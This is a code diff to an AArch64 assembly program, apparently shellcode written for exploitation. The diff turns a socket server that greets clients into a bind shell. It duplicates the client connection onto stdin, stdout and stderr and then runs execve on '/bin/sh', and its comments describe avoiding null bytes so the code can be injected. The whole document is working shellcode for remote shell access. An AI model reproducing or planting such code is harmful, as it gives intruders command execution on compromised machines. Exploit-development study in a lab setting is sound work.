@@ -44,17 +44,41 @@ _start:
     mov x8, #64             // Syscall for write
     svc #0x1337
 
-    ldr x0, [x20, #8]       // Move client connection for close
-    mov x8, #57             // Syscall for close
+    ldr x0, [x20, #8]       // Move client connection for dup
+    mov x1, xzr             // Dup stdin
+    mov x2, 0               // Flags
+    mov x8, #24             // Syscall for dup
     svc #0x1337
 
-    ldr x0, [x20]           // Move socket for close
-    mov x8, #57             // Syscall for close
+    ldr x0, [x20, #8]       // Move client connection for dup
+    mov x1, #1              // Dup stdout
+    mov x2, 0               // Flags
+    mov x8, #24             // Syscall for dup
     svc #0x1337
 
-    mov x0, xzr
-    mov w8, #93
-    svc #0
+    ldr x0, [x20, #8]       // Move client connection for dup
+    mov x1, #2              // Dup stderr
+    mov x2, 0               // Flags
+    mov x8, #24             // Syscall for dup
+    svc #0x1337
+
+    adr x0, sh          // Use adr instead of ldr for fewer null bytes
+    mov x1, xzr         // Move from zero register instead of using literal
+    mov x2, xzr
+    mov x8, #221        // Call execve
+    svc #0x1337
+
+    //ldr x0, [x20, #8]       // Move client connection for close
+    //mov x8, #57             // Syscall for close
+    //svc #0x1337
+
+    //ldr x0, [x20]           // Move socket for close
+    //mov x8, #57             // Syscall for close
+    //svc #0x1337
+
+    //mov x0, xzr
+    //mov w8, #93
+    //svc #0
 
 .section .data
     sockaddr:
@@ -65,3 +89,5 @@ _start:
 .section .text
     hello:
         .asciz "Hello!"
+    sh:
+        .asciz "/bin/sh"
